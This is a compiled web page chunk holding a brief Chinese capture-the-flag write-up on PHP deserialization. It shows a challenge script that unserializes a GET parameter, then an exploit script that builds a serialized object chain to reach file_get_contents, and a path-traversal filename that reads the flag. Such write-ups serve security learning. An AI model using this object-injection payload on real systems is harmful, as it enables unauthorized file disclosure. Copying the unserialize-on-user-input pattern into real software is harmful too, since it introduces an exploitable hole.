import{_ as n,o as s,c as a,e as p}from"./app-bd32c210.js";const e={},t=p(`<p>#PHP 序列化</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string single-quoted-string">&#39;flag.php&#39;</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">pkshow</span>
<span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function-definition function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string double-quoted-string">&quot;Pk very safe^.^&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">acp</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$cinder</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$neutron</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$nova</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cinder</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pkshow</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cinder</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cinder</span><span class="token operator">-&gt;</span><span class="token function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ace</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$openstack</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$docker</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">echo_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">openstack</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">docker</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">openstack</span><span class="token operator">-&gt;</span><span class="token property">neutron</span> <span class="token operator">=</span> <span class="token variable">$heat</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">openstack</span><span class="token operator">-&gt;</span><span class="token property">neutron</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">openstack</span><span class="token operator">-&gt;</span><span class="token property">nova</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;./<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filename</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token string double-quoted-string">&quot;keystone lost~&quot;</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;pks&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$logData</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;pks&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$logData</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使得 ace 的 $docker=null 可以绕过</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">acp</span>
<span class="token punctuation">{</span>
    <span class="token keyword">protected</span> <span class="token variable">$cinder</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$neutron</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$nova</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cinder</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ace</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;flag.php&#39;</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$openstack</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$docker</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">acp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>返回</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$heat</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;asdasdasdasd53asd3a1sd3a1sd3asd&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;flag in /nssctfasdasdflag&quot;</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>之后再改一下文件名 <code>$filename = &#39;../nssctfasdasdflag&#39;; </code>就可以</p>`,7),o=[t];function c(l,i){return s(),a("div",null,o)}const k=n(e,[["render",c],["__file","pklovecloud.html.vue"]]);export{k as default};
